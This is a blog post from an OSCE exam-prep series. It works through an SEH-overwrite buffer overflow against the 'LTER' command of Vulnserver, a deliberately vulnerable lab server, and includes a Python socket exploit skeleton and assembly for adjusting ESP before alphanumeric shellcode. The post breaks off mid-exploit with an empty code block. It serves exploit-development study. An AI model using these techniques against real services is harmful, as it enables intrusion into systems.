---
layout: single
title: CTP/OSCE Prep -- 'LTER' SEH Overwrite Version 2.0!
date: 2019-6-03
classes: wide
header:
  teaser: /assets/images/CTP/immunity.jpg
tags:
  - buffer overflow
  - Windows
  - x86
  - shellcoding
  - exploit development
  - assembly
  - python
  - OSCE
  - CTP
  - SEH
--- 
![](/assets/images/CTP/1920x1080_Wallpaper.jpg)

## Introduction

This series of posts will focus on the concepts I'm learning/practicing in preparation for [CTP/OSCE](https://www.offensive-security.com/information-security-training/cracking-the-perimeter/). In this series of posts, I plan on exploring:
+ fuzzing,
+ vanilla EIP overwrite,
+ SEH overwrite, and
+ egghunters.

Writing these entries will force me to become intimately familiar with these topics, and hopefully you can get something out of them as well! 

In this particular post we'll be using the skills we picked up last post to find our own way to exploit the 'LTER' command with an SEH overwrite.

If you have not already done so, please read some of the posts in the 'CTP/OSCE Prep' series as this post will be **light** on review! 

## Background 

This will be our third go at the 'LTER' command on Vulnserver. 
+ [The first time](https://h0mbre.github.io/LTER_SEH_Exploit/), I failed miserably to use the SEH overwrite, but I ended up discovering and EIP overwrite vulnerability with a smaller fuzzing payload.
+ [The second time](https://h0mbre.github.io/LTER_SEH_Success/#), I used @doylersec's approach to the SEH overwrite and worked through the exploit step-by-step for hours and was finally able to complete my own exploit modeled off of Doyler's.

Armed with the ability to use alphanumeric shellcode and a better understanding than the first time around, let's try to come up with our own unique take on the exploit and try to come up with something that's original to us.

## Getting Started

We will pick up after the taking the jump code in our 'next SEH address' 4 byte space to jump into our `D` buffer. At the moment, our exploit code looks like this: 
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

nSeh = '\x74\x06\x75\x04'

Seh = '\x2b\x17\x50\x62'

buffer += 'A' * 3514 
buffer += nSeh
buffer += Seh
buffer += 'D' * (4000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```
## From `D` Buffer to Top of `A` Buffer

Once we use our netjump in the `nSeh`, we land at the top of our `D` buffer in the address space `0174FFCC`. (Don't get too hung up on specific addresses as those will change from application instance to application instance, instead focus on the offsets or distances between two addresses. That number should remain static.)

![](/assets/images/CTP/Ltertake3.JPG)

If we scroll down in the CPU Instructions pane to the bottom, you can see that the last `44` instruction is sitting at `0174FFFF`.

![](/assets/images/CTP/ohyeahLTER.JPG)

To figure out the distance between those two points we do: (`0174FFFF` - `0174FFCC` = `33` or 51 in decimal). So we have **some** room to play with. Previously I tried to make use of this space to jump all the way back to the top of our `A` buffer and put shellcode there but I couldn't make it work because I didn't quite have a good handle on the `SUB` or `ADD` encoding you have to do with the shellcode to make it alphanumeric. 

Let's see what we can do now that we understand it a little bit better.

### Adjusting ESP

As we know, the first thing we have to do before putting our encoded shellcode on the stack is adjust `ESP`. As you can see from our screenshot, `ESP` is residing at `0174ECA4` and we want to put it at the bottom of our `D` buffer since our decoded shellcode will be plopped 'ontop' of it as it's decoded. To figure out how much we have adjust `ESP` we do (`0174FFFF` - `0174ECA4` = `135B` or 4,955 in decimal). So we have to add quite a bit!

To do this, let's:
+ put the current value of `ESP` into `EAX`,
+ add `0x135B` from `EAX`,
+ put the value of `EAX` back into `ESP`. 

In assembly this will look like this: 
```nasm
push esp
pop eax
add ax, 0x135b
push eax
pop esp
```

To get the opcodes, we'll use `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`:
```terminal_session
nasm > push esp
00000000  54                push esp
nasm > pop eax
00000000  58                pop eax
nasm > add ax, 0x135b
00000000  66055B13          add ax,0x135b
nasm > push eax
00000000  50                push eax
nasm > pop esp
00000000  5C                pop esp
```

Now let's update our exploit to reflect this new `espAdj` and test it:
```python

![](/assets/images/CTP/ltertest.JPG)


## Big Thanks

To everyone who has published free intro-level 32 bit exploit dev material, I'm super appreciative. Truly mean it. 

## Resources
+ [OffSec Alphanumeric Shellcode](https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/)
+ [Corelan Mona Tutorial](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)
